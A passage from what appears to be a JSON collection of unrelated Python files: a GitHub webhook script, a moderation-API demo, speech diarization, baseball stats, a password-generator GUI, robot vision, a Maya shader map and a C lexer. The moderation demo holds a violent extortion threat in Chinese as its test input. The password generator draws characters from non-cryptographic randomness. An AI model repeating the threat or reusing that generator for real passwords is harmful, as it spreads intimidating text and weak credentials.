client.delete_webhook(user, repo[\"name\"], webhook[\"id\"])\n                    logger.info(f\"Webhook deleted from {user}/{repo['name']}\")\n                else:\n                    logger.info(f\"Webhook already exists in {user}/{repo['name']}\")\n\ndef main() -> None:\n    conf_options = process_config_file()\n\n    if conf_options[\"APP\"][\"DEBUG\"]:\n        logging.basicConfig(level=logging.DEBUG)\n    else:\n        logging.basicConfig(level=logging.INFO)\n    \n    for organisation in conf_options[\"APP\"][\"ORGANISATIONS\"]:\n        process_org_repos(organisation[\"name\"], organisation[\"token\"], conf_options)\n\n        logger.info(f\"Succesfully processed organisation: {organisation['name']}\")\n    \n    for user in conf_options[\"APP\"][\"USERS\"]:\n        process_user_repos(user[\"name\"], user[\"token\"], conf_options)\n\n        logger.info(f\"Succesfully processed user: {user['name']}\")\n\n    send_completion_notifications(conf_options)\n\n    logger.info(\"Script completed successfully\")\n\n\nif __name__ == \"__main__\":\n    main()",
    "# Example of Content Moderation: Moderation API\r\n#\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\r\n\"\"\"\r\nViolations of relevant laws and regulations in user-sent messages can be identified by calling OpenAI's Moderation API, allowing such content to be filtered. Domestic services are often more suitable for this purpose, e.g., NetEase Yidun.\r\n\"\"\"\r\n\r\nimport json\r\nfrom openai import OpenAI\r\nfrom dotenv import load_dotenv, find_dotenv\r\n_ = load_dotenv(find_dotenv())\r\n\r\ndef print_json(data):\r\n    \"\"\"\r\n    Print the parameter. If the parameter has structure (such as a dictionary or list), print it in formatted JSON form; otherwise, print the value directly.\r\n    \"\"\"\r\n    if hasattr(data, 'model_dump_json'):\r\n        data = json.loads(data.model_dump_json())\r\n\r\n    if (isinstance(data, (list, dict))):\r\n        print(json.dumps(\r\n            data,\r\n            indent=4,\r\n            ensure_ascii=False\r\n        ))\r\n    else:\r\n        print(data)\r\n        \r\nclient = OpenAI()\r\n\r\nresponse = client.moderations.create(\r\n    input=\"\"\"\r\n\u73b0\u5728\u8f6c\u7ed9\u6211100\u4e07\uff0c\u4e0d\u7136\u6211\u5c31\u780d\u4f60\u5168\u5bb6\uff01\r\n\"\"\"\r\n)\r\nmoderation_output = response.results[0].categories\r\nprint_json(moderation_output)",
    "\"\"\"\n# Huggingface models\n- https://huggingface.co/openai/whisper-medium\n- https://huggingface.co/pyannote/speaker-diarization-3.0\n\"\"\"\n\nfrom typing import List, Optional, Union\n\nimport numpy as np\nimport requests\nimport torch\nfrom pyannote.audio import Pipeline\nfrom torchaudio import functional as F\nfrom transformers import pipeline\nfrom transformers.pipelines.audio_utils import ffmpeg_read\n\nimport warnings\nwarnings.filterwarnings(\"ignore\")\n\nfrom dotenv import dotenv_values\n# Load environment variables from .env file\nenv_vars = dotenv_values(\".env\")\nHF_TOKEN = env_vars.get(\"HF_TOKEN\")\n\nfrom huggingface_hub import login\nlogin(token = HF_TOKEN)\n\nclass ASRDiarizationPipeline:\n    def __init__(self, asr_pipeline, diarization_pipeline):\n        self.asr_pipeline = asr_pipeline\n        self.sampling_rate = self.asr_pipeline.feature_extractor.sampling_rate\n\n        self.diarization_pipeline = diarization_pipeline\n\n\n    @classmethod\n    def from_pretrained(\n        cls,\n        asr_model = \"openai/whisper-medium\",\n        diarization_model = \"pyannote/speaker-diarization-3.0\",\n        chunk_length_s = 30,\n        use_auth_token = True,\n        device = \"cuda\"\n    ):\n        asr_pipeline = pipeline(\n          \"automatic-speech-recognition\",\n          model=asr_model,\n          chunk_length_s=chunk_length_s,\n          device=f\"{device}:0\",\n          token=use_auth_token,\n        )\n        diarization_pipeline = Pipeline.from_pretrained(diarization_model, use_auth_token=use_auth_token)\n        diarization_pipeline.to(torch.device(device))\n\n        return cls(asr_pipeline, diarization_pipeline)\n\n\n    def postprocess_diarization(self, diarization_result):\n        segments = []\n        for segment, track, label in diarization_result.itertracks(yield_label=True):\n            segments.append({'segment': {'start': segment.start, 'end': segment.end},\n                            'track': track,\n                            'label': label})\n\n        new_segments = []\n        prev_segment = cur_segment = segments[0]\n        for i in range(1, len(segments)):\n            cur_segment = segments[i]\n\n            # check if there changed speaker (\"label\")\n            if cur_segment[\"label\"] != prev_segment[\"label\"] and i < len(segments):\n                # add the start/end times for the super-segment to the new list\n                new_segments.append(\n                    {\n                        \"segment\": {\"start\": prev_segment[\"segment\"][\"start\"], \"end\": cur_segment[\"segment\"][\"start\"]},\n                        \"speaker\": prev_segment[\"label\"],\n                    }\n                )\n                prev_segment = segments[i]\n\n        # add the last segment(s) if there was no speaker change\n        new_segments.append(\n            {\n                \"segment\": {\"start\": prev_segment[\"segment\"][\"start\"], \"end\": cur_segment[\"segment\"][\"end\"]},\n                \"speaker\": prev_segment[\"label\"],\n            }\n        )\n\n        return new_segments\n    \n\n    def merge_trancription(self, segments, asr_out, group_by_speaker=True):\n        transcript = asr_out[\"chunks\"]\n\n        # get the end timestamps for each chunk from the ASR output\n        end_timestamps = np.array([chunk[\"timestamp\"][-1] for chunk in transcript])\n\n        segmented_preds = []\n        # align the diarizer timestamps and the ASR timestamps\n        for segment in segments:\n            # get the diarizer end timestamp\n            end_time = segment[\"segment\"][\"end\"]\n            \n            # find the ASR end timestamp that is closest to the diarizer's end timestamp and cut the transcript to here\n            upto_idx = np.argmin(np.abs(end_timestamps - end_time))\n\n            if group_by_speaker:\n                segmented_preds.append(\n                    {\n                        \"speaker\": segment[\"speaker\"],\n                        \"text\": \"\".join([chunk[\"text\"] for chunk in transcript[: upto_idx + 1]]),\n                        \"timestamp\": (transcript[0][\"timestamp\"][0], transcript[upto_idx][\"timestamp\"][1]),\n                    }\n                )\n            else:\n                for i in range(upto_idx + 1):\n                    segmented_preds.append({\"speaker\": segment[\"speaker\"], **transcript[i]})\n\n            # crop the transcripts and timestamp lists according to the latest timestamp (for faster argmin)\n            transcript = transcript[upto_idx + 1 :]\n            end_timestamps = end_timestamps[upto_idx + 1 :]\n\n            if len(end_timestamps) == 0:\n                break\n\n        return segmented_preds\n\n\n    def __call__(self, inputs, group_by_speaker=True):\n\n        inputs, diarizer_inputs = self.preprocess(inputs)\n\n        diarization = self.diarization_pipeline(\n            {\"waveform\": diarizer_inputs, \"sample_rate\": self.sampling_rate},\n        )\n        new_segments = self.postprocess_diarization(diarization)\n\n        asr_out = self.asr_pipeline(\n            {\"array\": inputs, \"sampling_rate\": self.sampling_rate},\n            return_timestamps=True,\n ",
    "import pandas as pd\n\nfrom mlb_stats import stats\n\n\ndef get_lineup(season_years: list, team_lineup: list):\n    \"\"\"\n    season_years: list of years used to gather player/team stats\n    team_lineup: list of players in the batting lineup\n\n    :return:\n        list\n        [['tm', 'player1', PA, OBP, SLG, 1B, 2B, 3B, HR, GO, FO, SO, BB], ..., [Opp Fld%]]\n    \"\"\"\n    # lineup creation\n    team = str(input(f\"What team is up to bat?\\n\")).upper()\n    opp = str(input(f\"Who is {team}'s opponent?\\n\")).upper()\n\n    # matchup\n    stats_df = stats(season_years)\n    batting_df = stats_df[0]\n    fielding_df = stats_df[2]\n\n    # setting up lineup and pitching rotation\n    # team_lineup = []\n    # for player in range(1, 10):\n    #     team_lineup += [input(f\"Enter #{player} batter's name: \\n\")]\n\n    lineup = pd.DataFrame()\n    lineup_stats = []\n    for n, player in enumerate(team_lineup):\n        temp = batting_df[(batting_df[\"Name\"].str.lower() == player.lower())][\n            [\n                \"Name\",\n                \"OBP\",\n                \"SLG\",\n                \"PA\",\n                \"H\",\n                \"1B\",\n                \"2B\",\n                \"3B\",\n                \"HR\",\n                \"GO\",\n                \"FO\",\n                \"SO\",\n                \"BB\",\n            ]\n        ]\n        lineup = pd.concat([lineup, temp]).reset_index(drop=True)\n\n        lineup_stats += [\n            [\n                team,\n                lineup[\"Name\"][n],\n                lineup[\"OBP\"][n],\n                lineup[\"SLG\"][n],\n                lineup[\"PA\"][n],\n                lineup[\"H\"][n],\n                lineup[\"1B\"][n],\n                lineup[\"2B\"][n],\n                lineup[\"3B\"][n],\n                lineup[\"HR\"][n],\n                lineup[\"GO\"][n],\n                lineup[\"FO\"][n],\n                lineup[\"SO\"][n],\n                lineup[\"BB\"][n],\n            ]\n        ]\n\n    lineup_stats += [\n        float(fielding_df[fielding_df[\"Tm\"] == opp][\"Fld%\"].reset_index(drop=True)[0])\n    ]\n    lineup_stats += [team, opp]\n\n    return lineup_stats\n",
    "import customtkinter\r\nimport random\r\nimport pyperclip\r\nimport json\r\n\r\nsettings = {}\r\n\r\ndef set_settings ():\r\n    with open('settings.json', 'w') as f:\r\n        json.dump(settings, f)\r\n\r\ndef load_settings ():\r\n    global settings\r\n    with open('settings.json', 'r') as f:\r\n        settings = json.load(f)\r\n\r\n# G\u00e9n\u00e8re une suite de nombres al\u00e9atoire\r\ndef RNombre (difficulte):\r\n    i = 0\r\n    nombre = []\r\n    while i <= difficulte:\r\n        nombre.append(random.randint(1,9))\r\n        i += 1\r\n    tableau_str = [str(element) for element in nombre]\r\n    return tableau_str\r\n\r\n# Remplace les nombres al\u00e9atoires par des charact\u00e8res al\u00e9atoires\r\ndef Rmdp (difficulte):\r\n    characteres = ['a', '3', '/', ':', 'b', '-', '1', 'c', 'd', '4', 'e', 'f', '2', 'g', '!', 'h', 'i', 'j', '#', '9', 'k', 'l', 'm', 'n', '6', 'o', '+', 'p', 'q', 'r', '5', 's', '?', '@', 't', 'u', 'v', 'w', '7', 'x', 'y', '8', 'z']\r\n    mdp_int = RNombre(difficulte)\r\n    mdp_str = []\r\n    for c in mdp_int:\r\n        c = random.randint(0, 42)\r\n        mdp_str.append(characteres[c])\r\n    mdp = ''.join(mdp_str)\r\n    return mdp\r\n\r\n# Copie le mot de passe g\u00e9n\u00e9r\u00e9\r\ndef copier (mdp):\r\n    pyperclip.copy(mdp)\r\n    if settings['language'] == \"fr\":\r\n        label_copy.configure(text=\"Copi\u00e9 \u2705\")\r\n    elif settings['language'] == \"en\":\r\n        label_copy.configure(text=\"Copied \u2705\")\r\n\r\n# G\u00e9n\u00e8re le mot de passe en cliquant sur le bouton\r\ndef on_click ():\r\n    global mdp\r\n    if difficulte.get():\r\n        if int(difficulte.get()) > 800000:\r\n            if checked() == 'on':\r\n                mdp = ''.join(RNombre(800000))\r\n            else:\r\n                mdp = Rmdp(800000)\r\n                label_mdp2.configure(text=mdp)\r\n            label_mdp2.configure(text='*' * 800000)\r\n        else:\r\n            if checked() == 'on':\r\n                mdp = ''.join(RNombre(int(difficulte.get()) - 1))\r\n            else:\r\n                mdp = Rmdp(int(difficulte.get()) - 1)\r\n            label_mdp2.configure(text='*' * int(difficulte.get()))\r\n        set_language()\r\n        button.configure(width=40)\r\n        label_copy.configure(text='')\r\n        button_copy.place(x=175, y=300)\r\n        show_mdp()\r\n\r\n# D\u00e9fini si oui ou non l'utilisateur veut voir le mot de passe\r\ndef show_mdp ():\r\n    try:\r\n        if label_show.get() == \"on\":\r\n            label_mdp2.configure(text=mdp)\r\n        else:\r\n            label_mdp2.configure(text='*' * len(mdp))\r\n    except:\r\n        return\r\n\r\ndef checked ():\r\n    return check_box.get()\r\n\r\ndef openParameters ():\r\n    parameters_window.deiconify()\r\n\r\ndef closeParameters ():\r\n    parameters_window.withdraw()\r\n\r\ndef button_set_theme ():\r\n    global theme\r\n    if theme_input.get() == \"Clair\" or theme_input.get() == \"light\":\r\n        theme = \"light\"\r\n    elif theme_input.get() == \"Sombre\" or theme_input.get() == \"Dark\":\r\n        theme = \"dark\"\r\n    elif theme_input.get() == \"Syst\u00e8me (par d\u00e9faut)\" or theme_input.get() == \"System (default)\":\r\n        theme = \"system\"\r\n    set_theme()\r\n\r\ndef set_theme ():\r\n    if 'theme' in globals():\r\n        settings['theme'] = theme\r\n    customtkinter.set_appearance_mode(settings['theme'])\r\n    window.deiconify()\r\n    set_settings()\r\n\r\ndef button_set_language ():\r\n    global language\r\n    if language_input.get() == \"English\":\r\n        language = \"en\"\r\n    elif language_input.get() == \"Fran\u00e7ais\":\r\n        language =  \"fr\"\r\n    set_language()\r\n\r\ndef set_language ():\r\n    if 'language' in globals():\r\n        settings['language'] = language\r\n\r\n    if settings['language'] == \"fr\":\r\n        label.configure(text=\"Entrez la difficult\u00e9: \")\r\n        label2.configure(text=\"(max 800 000)\")\r\n        check_box.configure(text=\"Chiffres seulement\")\r\n        button.configure(text=\"G\u00e9n\u00e9rer\")\r\n        label_mdp1.configure(text='Mot de passe: ')\r\n        label_show.configure(text='Voir mot de passe')\r\n        label_language.configure(text=\"Choisir la langue :\")\r\n        confirmLanguage_bouton.configure(text=\"Confirmer\")\r\n        label_theme.configure(text=\"Choisir le th\u00e8me :\")\r\n        theme_input.configure(values=[\"Clair\", \"Sombre\", \"Syst\u00e8me (par d\u00e9faut)\"])\r\n        confirmTheme_bouton.configure(text=\"Confirmer\")\r\n        button_copy.configure(text=\"Copier\")\r\n        window.title(\"G\u00e9n\u00e9rateur\")\r\n        parameters_window.title(\"Param\u00e8tres\")\r\n\r\n    elif settings['language'] == \"en\":\r\n        label.configure(text=\"Enter the difficulty: \")\r\n        label2.configure(text=\"(800 000 max)\")\r\n        check_box.configure(text=\"Number only\")\r\n        button.configure(text=\"Generate\")\r\n        label_mdp1.configure(text='Password: ')\r\n        label_show.configure(text='Show password')\r\n        label_language.configure(text=\"Choose language :\")\r\n        confirmLanguage_bouton.configure(text=\"Confirm\")\r\n        label_theme.configure(text=\"Choose theme :\")\r\n        theme_input.configure(values=[\"Light\", \"Dark\", \"System (default)\"])\r\n        confirmTheme_bouton.configure(text=\"Confirm\")\r\n        button_copy.configure(text=\"Copy\")\r\n        window.title(\"Generator\")\r",
    "#!/usr/bin/env python\n\nimport cv2\nimport signal\nimport os\n\nimport numpy as np\nimport math\nimport time\nimport me\n\n\nfrom robolab_turtlebot import Turtlebot, detector\n\nmain_pid=os.getpid()\nWINDOW = 'markers'\nbumper_names = ['LEFT', 'CENTER', 'RIGHT']\nstate_names = ['RELEASED', 'PRESSED']\n\ndef bumper_cb(msg):\n    \"\"\"Bumber callback.\"\"\"\n    # msg.bumper stores the id of bumper 0:LEFT, 1:CENTER, 2:RIGHT\n    bumper = bumper_names[msg.bumper]\n\n    # msg.state stores the event 0:RELEASED, 1:PRESSED\n    state = state_names[msg.state]\n\n    # Print the event\n    print('{} bumper {}'.format(bumper, state))\n    os.kill(main_pid,signal.SIGKILL)\n\n\n\ndef get_delta(bod,pc):\n    x,y,w,h=bod\n    r_mid = (round(x+w/2),round(y+h/2))\n\n    dx = 0\n    dy = 0\n    dz = 0\n    index = 0\n\n    for i in range(-5,5):\n        for j in range(-5,5):\n            point = pc[r_mid[1]+i][r_mid[0]+j]\n            if not np.isnan(point[0]) and not np.isnan(point[1]) and not np.isnan(point[2]):\n                dx += point[0]\n                dy += point[1]\n                dz += point[2]\n\n                index+=1\n\n    if index>0:\n        dx /=index\n        dy /=index\n        dz /=index\n\n        return dx,dy,dz ,(round(x+w/2),round(y+h/2))\n    else:\n        return None, None, None, (None,None)\n\n\n\n\ndef main():\n\n    turtle = Turtlebot(rgb=True, pc =True)\n    cv2.namedWindow(WINDOW)\n    turtle.register_bumper_event_cb(bumper_cb)\n\n    while not turtle.is_shutting_down():\n        # get point cloud\n        image = turtle.get_rgb_image()\n        pc = turtle.get_point_cloud()\n\n        # wait for image to be ready\n        if image is None or pc is None:\n            continue\n\n        #hsv = cv2.cvtColor(image, cv2.COLOR_BGR2HSV)\n\n\n        print('update')\n        \"\"\"for y in range(len(image)):\n            for x in range(len(image[0])):\n                cceck(hsv[y][x],image,x,y)\"\"\"\n\n        \"\"\"r_low = np.array([0,130,80])\n        r_up = np.array([10,255,255])\n\n        b_low = np.array([90,130,80])\n        b_up = np.array([150,255,255])\n\n        g_low = np.array([50,130,80])\n        g_up = np.array([70,255,255])\n\n        rgb_masks['r'] = cv2.inRange(hsv, r_low, r_up)\n        rgb_masks['b'] = cv2.inRange(hsv, b_low, b_up)\n    (rgb_masks['g'] = cv2.inRange(hsv, g_low, g_up)\n        \"\"\"\n        rgb_masks=me.makeMasks(image)\n        #a_mask = cv2.bitwise_or(rgb_masks['r'],rgb_masks['b'])\n        #mask = cv2.bitwise_or(a_mask(rgb_masks['g'])\n        mask=cv2.bitwise_or(cv2.bitwise_or(rgb_masks['r'],rgb_masks['g']),rgb_masks['b'])\n\n        masked_img = cv2.bitwise_and(image, image, mask = mask)\n       \n\n        contours_r, _ = cv2.findContours(rgb_masks['r'],cv2.RETR_TREE,cv2.CHAIN_APPROX_SIMPLE)\n        contours_g, _ = cv2.findContours(rgb_masks['g'],cv2.RETR_TREE,cv2.CHAIN_APPROX_SIMPLE)\n        contours_b, _ = cv2.findContours(rgb_masks['b'],cv2.RETR_TREE,cv2.CHAIN_APPROX_SIMPLE)\n\n        r_slp = []\n        g_slp = []\n        b_slp = []\n        #cv2.imshow(WINDOW,cv2.bitwise_and(image,image,mask=rgb_masks['r']))\n        #cv2.waitKey(1)\n        img = None\n\n        for cnt in contours_r:\n            x,y,w,h = cv2.boundingRect(cnt)\n            if w*h>3000 and w*3<h and w*9>h:\n                r_slp.append((x,y,w,h))\n                img = cv2.drawContours(masked_img,[cnt],0,(255,255,255),2)\n                img = cv2.rectangle(masked_img,(x,y),(x+w,y+h),(0,0,255),2)\n\n        for cnt in contours_g:\n            x,y,w,h = cv2.boundingRect(cnt)\n            if w*h>3000 and w*3<h and w*9>h:\n                g_slp.append((x,y,w,h))\n                img = cv2.drawContours(masked_img,[cnt],0,(255,255,255),2)\n                img = cv2.rectangle(masked_img,(x,y),(x+w,y+h),(0,255,0),2)\n\n        for cnt in contours_b:\n            x,y,w,h = cv2.boundingRect(cnt)\n            if w*h>3000 and w*3<h and w*9>h:\n                b_slp.append((x,y,w,h))\n                img = cv2.drawContours(masked_img,[cnt],0,(255,255,255),2)\n                img = cv2.rectangle(masked_img,(x,y),(x+w,y+h),(255,0,0),2)\n\n        if img is not None:\n            cv2.drawMarker(img, (round(len(image[0])/2), round(len(image)/2)), color=[255, 255, 255], thickness=1, \n                markerType= cv2.MARKER_TILTED_CROSS, line_type=cv2.LINE_AA,\n                markerSize=10)\n\n        if len(r_slp)>0 and len(b_slp)>0:\n            dx_r,dy_r,dz_r , r = get_delta(r_slp[0],pc)\n            dx_b,dy_b,dz_b, b = get_delta(b_slp[0],pc)\n\n            if dx_r is None or dx_b is None:\n                continue\n\n            dx = (dx_r-dx_b)**2\n            dy = (dy_r-dy_b)**2\n            dz = (dz_r-dz_b)**2\n            \n            dff = dx+dy+dz\n\n            #print(dx_r,dz_r)\n            mid_x = dx_r+(dx_b-dx_r)/2\n            mid_y = dy_r+(dy_b-dy_r)/2\n            mid_z = dz_r+(dz_b-dz_r)/2\n            \n            p_x=mid_x+(dz_b-dz_r)\n            p_y=mid_y\n            p_z=mid_z-(dx_b-dx_r)\n\n\n\n            #print(mid_x,mid_z)\n            alfa = math.atan(mid_x/mid_z)\n            \n\n            if img is not None:\n                cv2.drawMarke",
    "import mayaUsd\nfrom pxr import UsdShade, Sdf, Gf\nimport maya.api.OpenMaya as om2\nimport traceback\nfrom math import pi\nimport re\n\nmayaTypeToSdf = {'kFloat' : Sdf.ValueTypeNames.Float,\n                'kInt' : Sdf.ValueTypeNames.Int,\n                'k3Float' : Sdf.ValueTypeNames.Color3f,\n                'Kstring' : Sdf.ValueTypeNames.String,\n                'k3Float' : Sdf.ValueTypeNames.Float3}\n\n\n# mayaShaderToRS = {\"RedshiftStandardMaterial\": ['StandardMaterial', 'outColor'],\n#                   \"RedshiftJitter\"          : ['Jitter', 'outColor'],\n#                   \"RedshiftDisplacement\"    : ['Displacement', 'out'],\n#                   \"file\"                    : ['TextureSampler', 'outColor']}\n\nmayaShaderToRS = {\"MultiOutputChannelTexmapToTexmap\" : [\"\", 'out'],\n                \"RedshiftAmbientOcclusion\" : ['AmbientOcclusion', 'out'],\n                \"RedshiftMathAbs\" : ['RSMathAbs', 'out'],\n                \"RedshiftMathAdd\" : ['RSMathAdd', 'out'],\n                \"RedshiftMathATan2\" : ['RSMathArcTan2', 'out'],\n                \"RedshiftMathACos\" : ['RSMathArcCos', 'out'],\n                \"RedshiftMathASin\" : ['RSMathArcSin', 'out'],\n                \"RedshiftMathATan\" : ['RSMathArcTan', 'out'],\n                \"RedshiftMathBias\" : ['RSMathBias', 'out'],\n                \"RedshiftBrick\" : ['Brick', 'outColor'],\n                \"RedshiftBumpBlender\" : ['BumpBlender', 'outDisplacementVector'],\n                \"RedshiftBumpMap\" : ['BumpMap', 'out'],\n                \"RedshiftCameraMap\" : ['RSCameraMap', 'outColor'],\n                \"RedshiftMathRange\" : ['RSMathRange', 'out'],\n                \"RedshiftMathAbsColor\" : ['RSMathAbsColor', 'outColor'],\n                \"RedshiftMathBiasColor\" : ['RSMathBiasColor', 'outColor'],\n                \"RedshiftColorRange\" : ['RSColorRange', 'out'],\n                \"RedshiftColorConstant\" : ['RSColorConstant', 'outColor'],\n                \"colorConstant\" : ['RSColorConstant', 'outColor'], #Maya color Constant\n                \"floatConstant\" : ['RSScalarConstant', 'out'], #Maya float Constant\n                \"RedshiftMathExpColor\" : ['RSMathExpColor', 'outColor'],\n                \"RedshiftMathGainColor\" : ['RSMathGainColor', 'outColor'],\n                \"RedshiftMathInvColor\" : ['RSMathInvertColor', 'out'],\n                \"RedshiftColorMaker\" : ['RSColorMaker', 'outColor'],\n                \"RedshiftColorMix\" : ['RSColorMix', 'outColor'],\n                \"blendColors\" : ['RSColorMix', 'outColor'], #Maya blend colors\n                \"RedshiftMathSaturateColor\" : ['RSMathSaturateColor', 'outColor'],\n                \"RedshiftColorSplitter\" : ['RSColorSplitter', ''],\n                \"RedshiftMathSubColor\" : ['RSMathSubColor', 'outColor'],\n                \"RedshiftColor2HSV\" : ['RSColor2HSV', 'outColor'],\n                \"RedshiftUserDataColor\" : ['RSUserDataColor', 'out'],\n                \"RedshiftMathCos\" : ['RSMathCos', 'out'],\n                \"RedshiftMathCrossVector\" : ['RSCrossProduct', 'out'],\n                \"RedshiftCurvature\" : ['RSCurvature', 'out'],\n                \"RedshiftDisplacement\" : ['Displacement', 'out'],\n                \"RedshiftDisplacementBlender\" : ['DisplacementBlender', 'out'],\n                \"RedshiftMathDiv\" : ['RSMathDiv', 'out'],\n                \"RedshiftMathDotVector\" : ['RSDotProduct', 'out'],\n                \"RedshiftEnvironment\" : ['RSEnvironment', 'outColor'],\n                \"RedshiftMathExp\" : ['RSMathExp', 'out'],\n                \"RedshiftFlakes\" : ['RSFlakes', 'out'],\n                \"RedshiftMathFloor\" : ['RSMathFloor', 'out'],\n                \"RedshiftMathFrac\" : ['RSMathFrac', 'out'],\n                \"RedshiftFresnel\" : ['RSFresnel', 'out'],\n                \"RedshiftMathGain\" : ['RSMathGain', 'out'],\n                \"RedshiftHSV2Color\" : ['RSHSVToColor', 'outColor'],\n                \"RedshiftHairPosition\" : ['RSHairPosition', 'outVector'],\n                \"RedshiftHairRandomColor\" : ['RSHairRandomColor', 'out'],\n                \"RedshiftIORToMetalTints\" : ['RSIORToMetalTints', ''],\n                \"RedshiftUserDataInteger\" : ['RSUserDataInteger', 'out'],\n                \"RedshiftMathInv\" : ['RSMathInv', 'out'],\n                \"RedshiftJitter\" : ['Jitter', 'outColor'],\n                \"RedshiftMathLn\" : ['RSMathLn', 'out'],\n                \"RedshiftMathLog\" : ['RSMathLog', 'out'],\n                \"RedshiftMatCap\" : ['RSMatCap', 'out'],\n                \"RedshiftMathMax\" : ['RSMathMax', 'out'],\n                \"RedshiftMaxonNoise\" : ['MaxonNoise', 'outColor'],\n                \"RedshiftMathMin\" : ['RSMathMin', 'out'],\n                \"RedshiftMathMix\" : ['RSMathMix', 'out'],\n                \"RedshiftMathMod\" : ['RSMathMod', 'out'],\n                \"RedshiftMathMul\" : ['RSMathMul', 'out'],\n                \"RedshiftMathNeg\" : ['RSMathNeg', 'out'],\n                \"RedshiftMathNormalizeVector\" : ['RSMathNormalizeVector', 'out'],\n                \"RedshiftOSLMap\" : ['rsOSL', ''],\n                \"RedshiftPavement\" : ['RSPavement', ''],\n          ",
    "import ply.lex as lex\nfrom ply.lex import TOKEN\n\nstates = (\n    ('string', 'exclusive'),\n)\n\n# TOKENS RULES\n# ---------- [INT RULES] ----------\ndigit = rf'[0-9]+'\nbit_integer_suffix_64 = rf'(i64|I64)'\nlong_long_suffix = rf'(ll|LL)'\nlong_suffix = rf'(l|L)'\nunsigned_suffix = rf'(u|U)'\n\n# Integer-suffix options\ninteger_suffix_1 = rf'{unsigned_suffix}({long_suffix}?)'\ninteger_suffix_2 = rf'{unsigned_suffix}{long_long_suffix}'\ninteger_suffix_3 = rf'{unsigned_suffix}{bit_integer_suffix_64}'\ninteger_suffix_4 = rf'{long_suffix}({unsigned_suffix}?)'\ninteger_suffix_5 = rf'{long_long_suffix}({unsigned_suffix}?)'\ninteger_suffix_6 = rf'{bit_integer_suffix_64}'\ninteger_suffix = rf'(({integer_suffix_1})|({integer_suffix_2})|({integer_suffix_3})|({integer_suffix_4})|({integer_suffix_5})|({integer_suffix_6}))'\n\nhexadecimal_digit =  rf'[0-9a-fA-F]'\noctal_digit = rf'[0-7]'\nnonzero_digit = rf'[1-9]'\nhexadecimal_prefix = rf'(0x|0X)'\n\nhexadecimal_constant = rf'({hexadecimal_prefix}{hexadecimal_digit}+)'\n\noctal_constant = rf'(0{octal_digit}+)'\n\ndecimal_constant = rf'({nonzero_digit}{digit}+)'\n\ninteger_constant_1 = rf'{decimal_constant}({integer_suffix}?)'\ninteger_constant_2 = rf'{octal_constant}({integer_suffix}?)'\ninteger_constant_3 = rf'{hexadecimal_constant}({integer_suffix}?)'\ninteger_constant = rf'(({integer_constant_1})|({integer_constant_2})|({integer_constant_3}))'\n\n# ---------- [OPERATOR RULES] ----------\nt_ALIGNMENT = r'_Alignof'\nt_SIZE = r'sizeof'\n\n# ---------- [FLOAT RULE] ----------\nfloating_suffix = r'[flFL]'\ndigit_sequence = r'(\\d+)'\nsign = r'[\\+\\-]'\nexponent_part = rf'([eE]{sign}?{digit_sequence})'\n\nfractional_constant_1 = rf'{digit_sequence}?\\.{digit_sequence}'\nfractional_constant_2 = rf'{digit_sequence}\\.'\nfractional_constant = rf'(({fractional_constant_1})|({fractional_constant_2}))'\n\nfloating_point_constant_1 = rf'{fractional_constant}{exponent_part}?{floating_suffix}?'\nfloating_point_constant_2 = rf'{digit_sequence}{exponent_part}{floating_suffix}?'\nfloating_point_constant = rf'(({floating_point_constant_1})|({floating_point_constant_2}))'\n\nint_regex = r'\\d+'\n\n#---------- [KEYWORD RULE] ----------\nkeywordr = r'[a-zA-Z_][a-zA-Z_0-9]*'\n\n#---------- [IDENTIFIER RULES] ----------\ndigit = rf'[0-9]'\nnondigit = rf'[_a-zA-Z]'\nidentifier = rf'({nondigit}+{digit}*)'\n\n#--------- [KEYWORDS RULES] ----------\nreserved = {\n    'auto'     : 'AUTO',\n    'break'    : 'BREAK',\n    'case'     : 'CASE',\n    'char'     : 'CHAR',\n    'const'    : 'CONST',\n    'continue' : 'CONTINUE',\n    'default'  : 'DEFAULT',\n    'do'       : 'DO',\n    'double'   : 'DOUBLE',\n    'else'     : 'ELSE',\n    'enum'     : 'ENUM',\n    'extern'   : 'EXTERN',\n    'float'    : 'FLOAT_KEYWORD',\n    'for'      : 'FOR',\n    'goto'     : 'GOTO',\n    'if'       : 'IF',\n    'inline'   : 'INLINE',\n    'int'      : 'INT_KEYWORD',\n    'long'     : 'LONG',\n    'register' : 'REGISTER',\n    'restrict' : 'RESTRICT',\n    'return'   : 'RETURN',\n    'short'    : 'SHORT',\n    'signed'   : 'SIGNED',\n    'sizeof'   : 'SIZEOF',\n    'static'   : 'STATIC',\n    'struct'   : 'STRUCT',\n    'switch'   : 'SWITCH',\n    'typedef'  : 'TYPEDEF',\n    'typeof'   : 'TYPEOF',\n    'typeof_unqual' : 'TYPEOF_UNQUAL',\n    'union'    : 'UNION',\n    'unsigned' : 'UNSIGNED',\n    'void'     : 'VOID',\n    'volatile' : 'VOLATILE',\n    'while'    : 'WHILE',\n    '_Alignas'        : '_ALIGNAS',\n    '_Alignof'        : '_ALIGNOF',\n    '_Atomic'         : '_ATOMIC',\n    '_Bool'           : '_BOOL',\n    '_Complex'        : '_COMPLEX',\n    '_Generic'        : '_GENERIC',\n    '_Noreturn'       : '_NORETURN',\n    '_Static_assert'  : '_STATIC_ASSERT',\n    '_Thread_local'   : '_THREAD_LOCAL',\n    '__asm'           : '__ASM',\n    '__based'         : '__BASED',\n    '__cdecl'         : '__CDECL',\n    '__declspec'      : '__DECLSPEC',\n    '__except'        : '__EXCEPT',\n    '__fastcall'      : '__FASTCALL',\n    '__finally'       : '__FINALLY',\n    '__inline'        : '__INLINE',\n    '__int16'         : '__INT16',\n    '__int32'         : '__INT32',\n    '__int64'         : '__INT64',\n    '__int8'          : '__INT8',\n    '__leave'         : '__LEAVE',\n    '__restrict'      : '__RESTRICT',\n    '__stdcall'       : '__STDCALL',\n    '__try'           : '__TRY',\n    '__typeof__'      : '__TYPEOF__',\n    '__typeof_unqual__' : '__TYPEOF_UNQUAL__',\n    'dllexport'       : 'DLLEXPORT',\n    'dllimport'       : 'DLLIMPORT',\n    'naked'           : 'NAKED',\n    'static_assert'   : 'STATIC_ASSERT',\n    'thread'          : 